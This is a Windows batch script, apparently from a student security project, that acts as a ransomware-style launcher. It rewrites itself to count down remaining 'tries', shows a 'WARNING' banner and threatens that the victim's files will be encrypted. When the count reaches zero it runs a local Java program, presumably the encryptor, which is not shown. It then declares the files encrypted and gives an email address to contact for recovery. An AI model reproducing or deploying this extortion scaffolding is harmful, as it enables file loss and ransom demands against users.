@set countTime=-1                            
@echo off                          
:::  .--.      .--.    ____     .-------.     ,---.   .--. .-./`)  ,---.   .--.   .-_'''-.                               
:::  |  |_     |  |  .'  __ `.  |  _ _   \    |    \  |  | \ .-.') |    \  |  |  '_( )_   \                              
:::  | _( )_   |  | /   '  \  \ | ( ' )  |    |  ,  \ |  | / `-' \ |  ,  \ |  | |(_ o _)|  '                             
:::  |(_ o _)  |  | |___|  /  | |(_ o _) /    |  |\_ \|  |  `-'`"` |  |\_ \|  | . (_,_)/___|                             
:::  | (_,_) \ |  |    _.-`   | | (_,_).' __  |  _( )_\  |  .---.  |  _( )_\  | |  |  .-----.                            
:::  |  |/    \|  | .'   _    | |  |\ \  |  | | (_ o _)  |  |   |  | (_ o _)  | '  \  '-   .'                            
:::  |  '  /\  `  | |  _( )_  | |  | \ `'   / |  (_,_)\  |  |   |  |  (_,_)\  |  \  `-'`   |                             
:::  |    /  \    | \ (_ o _) / |  |  \    /  |  |    |  |  |   |  |  |    |  |   \        /                             
:::  `---'    `---`  '.(_,_).'  ''-'   `'-'   '--'    '--'  '---'  '--'    '--'    `'-...-'                              
:::                                                                                                                      
set thisbatchname=%~nx0                            
set /a var=%countTime% - 1                    
echo @set countTime=%var% >newfile.txt                            
for /f "skip=1 delims=" %%L in (%thisbatchname%) do ( echo %%L>>newfile.txt )                            
move /y "%thisbatchname%" "tempname.bat" & ren "newfile.txt" "%thisbatchname%" & del "tempname.bat"                            
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A                    
IF %countTime% GTR 0 (                    
echo 			You only have %countTime% times left to try                           
echo 	If it becomes 0 all your file in following folder will be encrypted                           
echo 		     Contact us to give your file back to normal state                     
)                    
IF %countTime% EQU 0 (      
java --module-path D:/Data/JavaEnvironment/javafx-sdk-17.0.0.1/lib --add-modules=javafx.controls,javafx.fxml -cp java.jar com.example.projectantoanthongtin.HelloApplication      
)         
IF %countTime% LEQ 0 (                    
echo.                 
echo 			This file has been encrypted                  
echo 	Contact us to shegga9x@gmail.com to get your file in normal state                 
echo.              
)                   
pause                 
